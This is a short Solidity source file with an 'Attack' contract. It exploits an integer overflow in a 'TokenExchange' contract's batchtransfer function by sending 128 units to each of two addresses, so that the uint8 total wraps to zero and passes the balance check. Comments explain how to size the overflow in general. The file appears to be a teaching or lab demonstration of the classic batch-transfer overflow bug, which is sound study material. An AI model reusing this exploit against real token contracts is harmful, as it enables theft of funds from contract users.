// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;
import "contracts/Exchange.sol";

contract Attack {
    TokenExchange exchange;

    constructor(TokenExchange _exchange) payable {
        exchange = TokenExchange(_exchange);
        uint8 initial = 5;
        exchange.deposit(initial);
    }

    function attack(address[] calldata _addrs) public payable {
        //for simpilicity, we make sure it's 2 * 128, in general case
        //you just need to make sure _addrs.length * transfer amount
        //overflow(for uint8 we used in this example, it's 256), and 
        //lower than your current balance
        require(_addrs.length == 2);
        exchange.batchtransfer(_addrs, 128);
    }
}